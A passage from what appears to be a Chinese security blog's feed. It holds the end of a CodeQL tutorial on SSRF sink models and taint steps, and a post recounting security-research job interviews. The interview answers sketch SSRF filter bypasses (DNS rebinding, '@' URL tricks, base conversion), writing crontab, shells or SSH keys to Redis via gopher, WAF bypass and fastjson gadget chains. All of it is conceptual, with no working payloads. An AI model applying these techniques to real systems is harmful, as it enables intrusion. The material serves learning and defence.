class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">private predicate sinkModelCsv(string row) &#123;</span><br><span class="line">  row =</span><br><span class="line">    [</span><br><span class="line">      // Open URL</span><br><span class="line">      &quot;java.net;URL;false;openConnection;;;Argument[-1];open-url&quot;,</span><br><span class="line">      &quot;java.net;URL;false;openStream;;;Argument[-1];open-url&quot;,</span><br><span class="line">      &quot;java.net.http;HttpRequest;false;newBuilder;;;Argument[0];open-url&quot;,</span><br><span class="line">      &quot;java.net.http;HttpRequest$Builder;false;uri;;;Argument[0];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;URLClassLoader;(URL[]);;Argument[0];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;URLClassLoader;(URL[],ClassLoader);;Argument[0];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;URLClassLoader;(URL[],ClassLoader,URLStreamHandlerFactory);;Argument[0];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;URLClassLoader;(String,URL[],ClassLoader);;Argument[1];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;URLClassLoader;(String,URL[],ClassLoader,URLStreamHandlerFactory);;Argument[1];open-url&quot;,</span><br><span class="line">      &quot;java.net;URLClassLoader;false;newInstance;;;Argument[0];open-url&quot;,</span><br><span class="line">      // Bean validation</span><br><span class="line">      &quot;javax.validation;ConstraintValidatorContext;true;buildConstraintViolationWithTemplate;;;Argument[0];bean-validation&quot;,</span><br><span class="line">      // Set hostname</span><br><span class="line">      &quot;javax.net.ssl;HttpsURLConnection;true;setDefaultHostnameVerifier;;;Argument[0];set-hostname-verifier&quot;,</span><br><span class="line">      &quot;javax.net.ssl;HttpsURLConnection;true;setHostnameVerifier;;;Argument[0];set-hostname-verifier&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果直接跑 <code>sinkNode()</code> 代码，结果如下</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/sinkNodeRunResult.png" class><p>也就是通过上述的 <code>sinkModuleCsv</code>，其匹配所有 open-url 类型的数据类型。</p><ul><li>但是在新版本的 CodeQL 当中是找不到这一个规则的，在搜索了一堆资料后发现在新版本中是这样的。</li></ul><h4 id="isAdditionalTaintStep"><a href="#isAdditionalTaintStep" class="headerlink" title="isAdditionalTaintStep"></a>isAdditionalTaintStep</h4><p>看一下它的规则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">predicate isAdditionalFlowStep(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">    any(RequestForgeryAdditionalTaintStep r).propagatesTaint(pred, succ)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">// 跟进 RequestForgeryAdditionalTaintStep</span><br><span class="line"></span><br><span class="line">class RequestForgeryAdditionalTaintStep extends Unit &#123;</span><br><span class="line">  /**</span><br><span class="line">   * Holds if the step from `pred` to `succ` should be considered a taint</span><br><span class="line">   * step for server-side request forgery.</span><br><span class="line">   */</span><br><span class="line">  abstract predicate propagatesTaint(DataFlow::Node pred, DataFlow::Node succ);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private class DefaultRequestForgeryAdditionalTaintStep extends RequestForgeryAdditionalTaintStep &#123;</span><br><span class="line">  override predicate propagatesTaint(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">    // propagate to a URI when its host is assigned to</span><br><span class="line">    exists(UriCreation c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)</span><br><span class="line">    or</span><br><span class="line">    // propagate to a URL when its host is assigned to</span><br><span class="line">    exists(UrlConstructorCall c | c.getHostArg() = pred.asExpr() | succ.asExpr() = c)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private class TypePropertiesRequestForgeryAdditionalTaintStep extends RequestForgeryAdditionalTaintStep</span><br><span class="line">&#123;</span><br><span class="line">  override predicate propagatesTaint(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">    exists(MethodAccess ma |</span><br><span class="line">      // Properties props = new Properties();</span><br><span class="line">      // props.setProperty(&quot;jdbcUrl&quot;, tainted);</span><br><span class="line">      // Propagate tainted value to the qualifier `props`</span><br><span class="line">      ma.getMethod() instanceof PropertiesSetPropertyMethod and</span><br><span class="line">      ma.getArgument(0).(CompileTimeConstantExpr).getStringValue() = &quot;jdbcUrl&quot; and</span><br><span class="line">      pred.asExpr() = ma.getArgument(1) and</span><br><span class="line">      succ.asExpr() = ma.getQualifier()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看注释是比较明确的，也就是通过 <code>isAdditionalFlowStep()</code>，将 <code>pred</code> 和 <code>succ</code> 两个点连起来，这里的连接方式是通过污点传递来实现的。具体的匹配方式很容易理解，跟进一下 <code>UriCreation</code> 和 <code>UrlConstructorCall</code> 即可</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;CodeQL · 真入门&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    <category term="CodeQL" scheme="https://drun1baby.github.io/categories/CodeQL/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
    <category term="CodeQL" scheme="https://drun1baby.github.io/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>2023 春招安全研究岗位面经分享</title>
    <link href="https://drun1baby.github.io/2023/08/23/2023-%E6%98%A5%E6%8B%9B%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E5%B2%97%E4%BD%8D%E9%9D%A2%E7%BB%8F%E5%88%86%E4%BA%AB/"/>
    <id>https://drun1baby.github.io/2023/08/23/2023-%E6%98%A5%E6%8B%9B%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E5%B2%97%E4%BD%8D%E9%9D%A2%E7%BB%8F%E5%88%86%E4%BA%AB/</id>
    <published>2023-08-23T14:39:22.000Z</published>
    <updated>2023-12-13T07:34:44.194Z</updated>
    
    <content type="html"><![CDATA[<p>随手记录一下</p><span id="more"></span><h2 id="安恒卫兵实验室"><a href="#安恒卫兵实验室" class="headerlink" title="安恒卫兵实验室"></a>安恒卫兵实验室</h2><p>1、你的简历与你之前发过来的简历有什么变化吗？</p><p>2、说一说你研究过的东西，然后有什么产出</p><p>这里我说研究了 Weblogic、shiro，但是没产出，那边似乎比较失望。</p><p>3、最近出了 Weblogic 的一个新的洞，你有研究过吗？自己在研究的时候有没有思考过别人是怎么挖出来的洞。</p><p>人麻了，没复现漏洞过，然后也没思考过这个。。</p><p>4、你觉得挖什么样子的洞比较好呢？你一般是怎么开展研究的</p><p>我说看漏洞类型，但是无论如何你需要先去简单了解一下它的流程，如果一个组件的流程你不清楚，盲目的开始挖洞比较愚蠢，像盲人摸象。然后在了解过基础流程之后，如果是反序列化的洞，就用 codeql、tabby 这些东西去找漏洞。</p><p>不知道那边是什么想法，不过有一说一面我的时候感觉大部分时候都是吸气和叹气qaq</p><p>5、你学习安全是什么时候开始的呢，一路上的经历是怎么样的</p><p>就简单聊了聊</p><p>6、有没有什么让你感觉很自豪的项目</p><p>当时说了 golang 写 sqlmap</p><p>7、你是什么状况下去学习 golang 的呢？是出于什么考虑呢</p><p>似乎很多面试官都会问这个问题，还是和之前一样回答了一下。</p><p>8、为什么在连连只实习了一个月呢？都做了什么业务</p><p>xxx</p><p>9、能简单说说在连连做了什么渗透测试吗？</p><p>10、能说一说常见的 SQL 注入种类吗？自己有绕过过一些 SQL 注入的 waf 吗？</p><p>这里说了绕过安全狗，麻了，当时就想到很可能会问 HIDS 的相关内容，果不其然后面就问了</p><p>11、一般是怎么绕 waf 呢？具体说说</p><p>我说了先 fuzz，然后具体的 bypass 就根据可用字符来打，那边似乎很不满意</p><p>12、有遇到过语意型的 waf 吗？自己是怎么 bypass 的呢？</p><p>我这里真的有点麻，满脑子都是 HIDS 和阿里的产品，包括先知 ban waf</p><p>13、如果给到你一个1day，你要怎么样进行漏洞分析呢？</p><p>14、又问了我如果就是一个 SQL 注入的 1day，让你漏洞分析，你会怎么分析呢，比如是有些特定条件下的 SQL 注入，比如什么什么配置文件下，你会怎么分析呢？</p><p>15、那你这样分析流程不会很耗时间吗？如果ddl之前你还没有分析完漏洞呢？你会怎么办？</p><p>16、那如果还是分析不出来，你是不是要思考一下你的方法是不是有问题了</p><p>我: 嗯……应该是吧</p><p>17、那如果你的 1day 积累的很多都完不成呢</p><p>我说我可能会考虑问一下其他有过经验的师傅，多多取经。</p><p>我大致了解你的情况了，能说说 SSRF 怎么样才能最好的利用呢？</p><p>我说，SSRF 用的好的话是可以 rce 的，但是前提是你需要先探活。当然这里 rce 的方式有很多，比如配合文件上传 gopher 打。</p><p>18、那如果目前我们探活出来有个 redis 服务，你要怎么打呢</p><p>SSRF 打 redis 的本质就是仿 redis 命令，将其写入一些 shell。我答了最多的一般都是 crontab，还有写入 shell，就类似于文件包含的原理。其实还有写入 ssh 私钥。还有主从复制什么的。</p><p>19、能说一说 ssrf 的防御嘛</p><p>我说了加白，最常用的方法，后续又补充了说限制一些不必要的协议，像 gopher 这种完全没必要啊，还有就是不给回显，这样的话对方探活也探不出什么东西，可能就以为这里并不存在 ssrf，但还得是白名单牛逼</p><p>20、那如果在变量里面呢？你要怎么过滤</p><p>我感觉这里就是加个 filter，实现单一职责原则</p><p>21、那如果我这里限制了 127.0.0.1，限制了 127.0.0.2 ，那你要怎么 bypass 呢</p><p>我直接说了 dns rebinding，我说这种攻击非常可观。面试官问我还有没有其他的呢？我补充了 @ 符绕过，进制转换，句号替换.符号。</p><p>22、能展开讲讲 @ 符是这么绕过的吗</p><p>这里其实是和 url 协议是有关系的，因为我们本质的 url 协议是这样请求资源的<br>http∶&#x2F;&#x2F;url@ip，然后后面跟上请求的资源，比如 <a class="link" href="http://www.baidu.com@1.1.1.1,那么我们这里把后面/">http://www.baidu.com@1.1.1.1，那么我们这里把后面<i class="fas fa-external-link-alt"></i></a> @ 的内容修改成恶意的 127.0.0.1即可。</p><p>23、面试官又问，如果把这些各种符号都禁了呢，因为很多时候我们会过滤这些输入。</p><p>我说那就 dns rebinding 呗，面试官说 dns rebinding 的事儿到时候再说。然后答了进制转换，他说算一种，又答了 xip.io 与 xip.name<br>泛域名解析，无需配置，将自定义的任何域名解析到指定的 IP 地址。假设你的 IP 地址是 10.0.0.1，你只需使用 前缀域名+IP地址+xip.io 即可完成相应自定义域名解析。</p><p>24、关于内存马有了解嘛？可以简单讲讲有哪些内存马吗？</p><p>我说了我只搞了 Tomcat 型内存马，我知道还有 Agent 型内存马和 websocket 型，还有 upgrade 型内存马。</p><p>25、内存马的查杀了解过原理吗？</p><p>我麻了，我说看调用的所有的filters，看哪些 filters 是恶意的，是程序没有的</p><p>26、后面问了问实习薪资期望</p><blockquote><p>接下来就是反问环节</p></blockquote><h2 id="白帽汇安全研究面试"><a href="#白帽汇安全研究面试" class="headerlink" title="白帽汇安全研究面试"></a>白帽汇安全研究面试</h2><h3 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h3><p>1、自我介绍</p><p>2、讲一讲最近在做什么吧</p><p>3、说一说 Shiro 这个洞都了解多少</p><p>4、自己有没有独立挖出过 0day</p><p>5、weblogic 了解多少</p><p>说了一下复现了的漏洞，然后面试官让我说一说具体的一个漏洞</p><p>6、weblogic 的 T3 和 XMLDecoder 漏洞展开讲讲吧</p><p>7、fastjson 复现过多少漏洞，你研究的版本是多少</p><p>8、能简单说一说 Java 反序列化的流程吗？</p><p>9、讲讲 RMI 的通信原理以及为什么会存在漏洞</p><p>10、看到你还有在看 PHP 的东西，一般是研究哪种为主呢，PHP 还是 Java</p><p>11、说一说你做过的一些项目吧</p><p>12、写这个 Java 路线，你是出于什么考虑呢？</p><p>13、看到你审计过一些 CMS，自己从中有什么收获吗？</p><h3 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h3><p>二面主要是聊了聊一些挖洞的思想&#x2F;个人经历，很有聊天的感觉，个人忘记记录完全了。</p><h3 id="HR-面"><a href="#HR-面" class="headerlink" title="HR 面"></a>HR 面</h3><p>1、看到你的简历上写了有说网络安全协会，都做了协会哪些工作呢</p><p>2、预期薪资是多少呢，我说在北京差不多 330&#x2F;天吧</p><p>后面又说给实习生薪资一个月是 5500</p><p>3、有没有一段很难的时光</p><p>4、你是独生子女吗</p><p>5、最让你自豪的一件事是什么</p><p>6、在 CTF 上让你有很自豪的事情吗</p><p>7、有收到其他家的 offer 吗</p><p>8、目前多久能过来呢</p><h2 id="极氪安全研究"><a href="#极氪安全研究" class="headerlink" title="极氪安全研究"></a>极氪安全研究</h2><p>1、简单说一说你作为红队，在 hvv 期间会有怎样的视角</p><p>我说，这是不是就是 hvv 视角下的红队攻击。面试官说是的</p><p>然后就说了社工钓鱼、信息收集、外网打点、内网横移、还有就是通过信息泄露拿源码，再进行源码审计，再就是 0day、1day 的应用、恶意流量分析</p><p>2、听到你说了源码审计，简单说一下思路吧</p><p>就还是那一套 filter ——&gt; pom.xml ——&gt; 细的功能点 ——&gt; 调试</p><p>3、说一说如果 hvv 期间出了一个 fastjson 的 day，你需要怎么防护</p><p>给我特么问住了，面试官其实在这个过程中一直在向我往工具利用那方面引导。我说了加黑，然后加白这样的策略。</p><p>他又和我说，怎么样判断资产里面是否存在这个漏洞呢。我说用工具测，说如果你们有比较成熟的白盒扫描工具是可以的，但是我没用过。反正这个问题纠结了很久。。。。</p><p>4、说一说内网横移的思路吧</p><p>我说分 Windows 和 Linux，Linux 比较难横移；Windows 就还是那一套</p><p>5、说一说除了 web 服务之外还有服务值得注意</p><p>这个问题问的挺。。。隐晦</p><p>其实就是问有哪些端口，我就说了那些</p><p>6、说一说你用 python 做过的一些项目吧</p><p>简单聊了聊</p><p>7、有做过白盒代码审计的一些项目吗</p><p>没有</p><p>8、如果你挖掘 Java 反序列化的 0day，你会怎么挖掘呢</p><p>就还是那样</p><blockquote><p>下面是反问环节</p></blockquote><p>主要问了问他们的业务、转正、一般上班强度如何、部门地位如何、食堂</p><p>就这些</p><h2 id="墨云科技安全研究"><a href="#墨云科技安全研究" class="headerlink" title="墨云科技安全研究"></a>墨云科技安全研究</h2><p>总体上来说和白帽汇的面试很像，当时便没有记录，而且问的很急</p><h2 id="奇安信观星实验室"><a href="#奇安信观星实验室" class="headerlink" title="奇安信观星实验室"></a>奇安信观星实验室</h2><h3 id="一面-1"><a href="#一面-1" class="headerlink" title="一面"></a>一面</h3><p>1、先做个自我介绍吧</p><p>2、我看你有复现过一些 Java 反序列化的漏洞，简单讲一讲漏洞原理吧。</p><p>easy</p><p>3、在这些反序列化的链子里面，有什么比较共通的地方吗</p><p>我说了链首、链尾、sink 要求</p><p>4、你有审计 Java 代码的经验，可以简单说一说吗？</p><p>说了一些思路</p><p>5、我看你 CTF 打的很多，其中应该有很多 PHP 吧，然后你挖的 PHP 洞也挖了几个，简单讲讲让你印象深刻的洞吧。</p><p>说了一个 SQL 注入，一个 phar</p><p>6、我看你复现过 fastjson 系列的洞，说一说最新的那个 fastjson 1.2.80 的洞吧，就浅蓝挖的那个</p><p>日了。。。我没很好的复现过</p><p>7、那你说一说 fastjson 的一些漏洞原理和绕过思路吧</p><p>我说了一些，但是有一条通杀的 jdbc 没有很好的分析过，后悔。</p><p>8、PHP 反序列化的漏洞挖掘思路可以说一下吗？</p><p>这个不会</p><p>9、jpress 我看你有审计的校验，有自己搞出来一些前台 RCE 吗</p><p>无</p><p>10、简单聊一聊 Java 内存马吧，原理以及如何写入</p><p>后面就是反问环节，问了一下他们的业务，然后大概组织架构，转正情况</p><h3 id="二面-1"><a href="#二面-1" class="headerlink" title="二面"></a>二面</h3><p>说实话二面没有准备好，因为一些特殊原因</p><p>1、做个自我介绍吧，主要讲一讲自己研究哪个方向。</p><p>2、PHP 审计过哪些大型的 CMS 呢</p><p>我说了 TP，还有一些其他的自己审计的</p><p>3、TP 里面不是有个命令执行吗？可以说一说里面大概后利用是怎么利用的，比如现在目标站开启了 <code>disabled_function</code></p><p>我这里有点麻，本身 PHP 就不是很好，我说如果利用角度来说，蚁剑的插件就行，如果没有这个条件的话就手动写入 <code>.so</code> 文件</p><p>那你详细说一说怎么写进去…… 寄、我忘了具体利用手法</p><p>4、PHP 里面的 extract 变量覆盖这个问题，有在实际漏洞挖掘的时候遇到过吗</p><p>没有</p><p>5、面试官似乎还是很想问 PHP 的，问了 PHP 的另外一个问题，还是没怎么答出来。</p><p>又问了问 最近打的 CTF，主要是 ant 和 阿里云，让我讲讲印象深刻的题目，我都忘得差不多了。。</p><p>6、说一说 Java JDBC MySQL 反序列化这个漏洞吧</p><p>我说这只是给了一个入口，需要伪造 MySQL fake server</p><p>7、那你说一说怎么判断 MySQL jdbc 的版本吧</p><p>我说 wireshark 抓个包，内容应该会在里面</p><p>8、看你 Java CMS 审计过 jpress，当时是复现还是</p><p>我说了复现，然后让我聊一聊印象最深刻的一个洞</p><p>9、如果现在有个文件上传，但是只有 <code>Web-INF</code> 下的 <code>.jsp</code> 文件才会被渲染，你有什么思路</p><p>我说了 SSTI、crontab、sh、weblogic 的部署都可以</p><p>10、你有在大型攻防演练当中跟进过一些 VMware 类型的漏洞吗？展开聊聊</p><p>我说我只做过蓝队，然后 VMware 的话，最新的洞正在看。然后简单讲一讲，感觉面试官没有复现这个漏洞</p><p>11、听你说分析了 RocketMQ 的洞，简单聊聊吧</p><p>就简单聊了聊</p><p>12、那如果不出网呢？</p><p>。。。。我说这个单纯从这个漏洞的角度来说，其实是可以写入 crontab 的，但是实际打内存马，我还没有试过。</p><p>下面就是反问环节</p><h2 id="沥泉科技红队安全研究"><a href="#沥泉科技红队安全研究" class="headerlink" title="沥泉科技红队安全研究"></a>沥泉科技红队安全研究</h2><p>1、做个自我介绍吧</p><p>2、看你漏洞这块，Java，PHP，Python 都有了解是吗？简单说一说怎么审计 PHP 漏洞的吧。</p><p>说了用 Seay 扫一扫，然后对扫出来的重点去审计，黑白盒结合一起打</p><p>3、Seay 是很老的东西了，你有没有修改一下它的规则什么的</p><p>答：没有。。。寄</p><p>4、如果你没有修改过的话，那你怎么样才能挖出别人挖不出来的洞呢？</p><p>不会啊。。麻了</p><p>5、说一说了解的 Java 漏洞吧，像 fastjson、shiro 这些，就先说说 fastjson 吧，你对它了解多少。</p><p>这里我说了说 fastjson 最好用的两条链子，一条是 templatesImpl 的，另外一条是不出网的 BCEL。</p><p>6、简单说一说 fastjson 的 checkAutoType 吧</p><p>如果开启了就是先白名单过滤，再黑名单。</p><p>如果没开启就是会先黑名单，再白名单。</p><p>7、那关于 fastjson 的 parse 和 parseObject 呢？</p><p>parseObject：返回 fastjson.JSONObject 类</p><p>parse ：返回我们的类 User</p><p>一般来说 parseObject 的利用面更广</p><p>8、有学过哪些框架和组件呢？为什么要学他们</p><p>就简单说了说，不过我的回答好像让那边挺满意的</p><p>9、关于 Shiro 的漏洞，有了解吗？展开说说</p><p>说了 550，721 和权限绕过</p><p>10、说一说 721 的 Oracle Padding Attack 的原理</p><p>寄，没背过</p><p>11、你用 Python 写过什么工具吗</p><p>说了说自己写了爬虫，然后写了个网段扫描的工具。</p><p>12、说到 nmap，一般 nmap 扫描很慢的时候会怎么办呢？</p><p>这里应该是用 msscan 比较好</p><p>13、有了解过内网么？说一说 Kerberos 协议的流程吧，后面又问了 NTLM 协议的流程</p><p>寄</p><p>14、除了 NTLM Hash，还知道哪些 Hash 呢</p><p>寄</p><p>15、src 自己有在挖嘛，简单说一说信息收集的一些方法吧。</p><p>寄，后门 l3m0n 师傅说有十多种方法。。。</p><p>16、话说 fastjson 需要碰到高版本的 jdk8 的时候要怎么绕过呢</p><p>这个其实就是 jndi 打高版本 jdk 的思路</p><p>17、Java 设计模式了解多少呢</p><p>18、打 CTF 是跟着战队拿奖还是自己校队拿奖</p><p>19、内网渗透的流程都了解吗</p><p>20、我大致了解你的情况了，可以说一说你的规划预期吗</p><hr><p>接下来就是反问环节，主要是问了问他们到底是做什么业务的。</p><p>面我的是 l3m0n 师傅，很强</p><h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>投的太晚了，金三银四，我是四月底投的，差不多五月初的样子，这个非常不利。</p><p>自己能力上还是有非常多的不足。</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>最终是入职了安恒，不过那地方待个两三个月就可以走了，差不多得了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;随手记录一下&lt;/p&gt;</summary>
    
    
    
    
    <category term="面经" scheme="https://drun1baby.github.io/tags/%E9%9D%A2%E7%BB%8F/"/>
    
  </entry>
  
</feed>
